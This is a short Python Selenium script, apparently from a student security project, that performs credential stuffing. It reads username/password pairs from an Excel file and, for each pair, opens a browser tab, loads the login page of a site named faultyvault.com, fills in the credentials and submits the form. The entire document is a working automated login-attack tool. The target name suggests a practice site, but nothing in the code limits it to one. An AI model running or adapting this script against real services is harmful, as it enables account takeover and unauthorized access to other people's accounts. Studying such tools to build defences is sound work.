from selenium import webdriver
import xlrd
import time

#location of the excel file containing username/password combinations
loc = ("/home/clint/Dropbox/school/cs467/CredentialStuffing/test.xlsx")

#open the excel file to read the rows
viewxl=xlrd.open_workbook(loc)
sheet=viewxl.sheet_by_index(0)

#enable webdriver for chrome. Path to chromedriver file is listed
website=webdriver.Chrome('/home/clint/chromedriver')

#iterate over all the rows in the excel file
for i in range(sheet.nrows):
    #open a browser window and a new tab
    website.execute_script("window.open('');")
    website.switch_to.window(website.window_handles[i+1])

    #enter address of the site you want to test
    website.get('http://www.faultyvault.com/login_sessions')

    #assigns username and password from current row in file to variable
    uname=str(sheet.cell_value(i,0))
    upass=str(sheet.cell_value(i,1))

    #enter username in form field
    username=website.find_element_by_id('UsernameInput')
    username.send_keys(uname)

    #enter password in the form field
    password=website.find_element_by_id('PasswordInput')
    password.send_keys(upass)

    #click the login button
    submit=website.find_element_by_id('LoginButton')
    submit.click()
